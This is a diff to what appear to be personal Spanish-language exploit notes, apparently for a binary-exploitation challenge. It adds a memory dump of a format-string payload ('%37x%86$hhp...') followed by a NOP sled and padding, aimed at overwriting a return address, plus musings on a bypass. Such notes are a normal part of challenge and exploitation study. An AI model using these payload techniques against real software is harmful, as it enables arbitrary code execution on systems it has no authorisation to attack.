@@ -34,3 +34,19 @@ pasos:
 
 mi input desencriptado = 0x00602560
 el ret addr = 0x40140a
+
+
+
+0x00602560  2533 3778 2538 3624 6868 7025 3539 78 %37x%86$hhp%59x
+0x0060256f  2538 3724 6868 7025 3530 7825 3835 24 %87$hhp%50x%85$
+0x0060257e  6868 7020 9090 9090 9090 9090 9090 90 hhp ...........
+0x0060258d  9090 9090 9090 9090 9090 9090 9090 90 ...............
+0x0060259c  9090 9090 9090 9090 9090 9090 9090 90 ...............
+0x006025ab  9090 9090 9090 9090 9090 9090 9090 90 ...............
+0x006025ba  9090 9090 9090 9090 9090 9090 9090 90 ...............
+0x006025c9  5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a5a 5a ZZZZZZZZZZZZZZZ
+
+PROBLEMA:
+si mi input es muy grande, entonces no esta en el stack,
+bypass?
+el ciphertext si esta, quiza hacer algo raro y psar por ahi las address de ret
